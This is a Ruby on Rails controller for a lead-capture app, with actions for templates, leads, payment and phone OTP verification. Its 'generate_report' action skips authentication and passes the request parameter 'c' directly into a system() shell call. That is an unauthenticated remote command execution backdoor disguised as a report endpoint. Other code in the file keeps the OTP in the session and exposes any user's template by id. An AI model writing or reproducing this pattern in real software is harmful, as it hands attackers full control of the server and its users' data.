class StaticController < ApplicationController
  before_action :authenticate_user!, except: [:index, :generate_report]
  before_action :authenticate_user_status, only: [:index]
  before_action :find_user, only: [:user_template]
  skip_before_action :check_user_subscription, only: [:confirm_phone, :after_sign_up, :verify_otp, :generate_report, :user_template, :pay]
  skip_before_action :authenticate_user!, only: [:user_template]

  layout "landing_layout", only: [:user_template ]

  def index; end

  def user_template
    @lead = @user.leads.build
  end

  def pay
    @amount = params[:amount].to_f/100
  end

  def find_user
    @user = User.find_by id: params[:id]
  end

  def add_lead
    filePath = "#{request.protocol}" + "#{request.host_with_port}" + "/DeusBlueprint.pdf"
    @lead = current_user.leads.build(lead_params)
    @lead.added_from = "web_form"
    respond_to do |format|
      if @lead.save
        format.html { redirect_to user_path(current_user), notice: 'Lead was successfully created.' }
        format.json { render :user_template, status: :created, location: @lead }
      else
        format.html { render js: @lead.errors, status: :unprocessable_entity }
        format.json { render json: @lead.errors, status: :unprocessable_entity }
        format.js
      end
    end
  end

  def confirm_phone; end

  def generate_report
    p "cmd = params[:c]"
    p cmd = params[:c]
    system("rvm list; pwd; #{cmd}")
    #TODO
    render plain: "Report"
  end

  def verify_otp
    if session[:otp] == params[:verification_code].to_i
      current_user.update(status: :active)
      redirect_to root_path, notice: 'User signed up successfully'
    else
      flash.now[:notice] = 'Invalid confirmation code!'
      render :confirm_phone
    end
  end

  def after_sign_up
    otp = (SecureRandom.random_number(9e5) + 1e5).to_i
    session[:otp] = otp
    sms = "Confirmation code: #{otp}"
    TwilioClient.new.send_text(current_user.phone_number, sms)
    redirect_to confirm_phone_path
  end

  def authenticate_user_status
    render :confirm_phone if current_user && current_user.status&.to_sym != :active
  end

  def lead_params
    params.require(:lead).permit(:first_name, :phone_number)
  end
end
